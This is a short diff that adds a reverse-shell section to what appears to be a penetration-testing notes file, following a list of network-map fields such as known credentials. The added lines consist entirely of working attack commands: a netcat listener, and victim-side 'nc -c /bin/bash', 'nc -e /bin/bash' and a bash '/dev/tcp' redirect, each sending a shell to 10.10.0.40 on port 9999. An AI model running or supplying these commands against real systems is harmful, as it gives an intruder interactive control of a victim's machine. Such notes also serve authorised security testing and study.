@@ -225,11 +225,18 @@ Required info for network maps
       OS type/version
       Known credentials
 
-
-
-
-
-
+Reverse shell with nc and /dev/tcp
+    First listen for the shell on your device.
+    $ nc -lvp 9999
+        On Victim using -c :
+    $ nc -c /bin/bash 10.10.0.40 9999
+        On Victim using -e :
+    $ nc -e /bin/bash 10.10.0.40 9999
+    
+    First listen for the shell on your device.
+    $ nc -lvp 9999
+    On Victim:
+    $ /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1
 
 
 
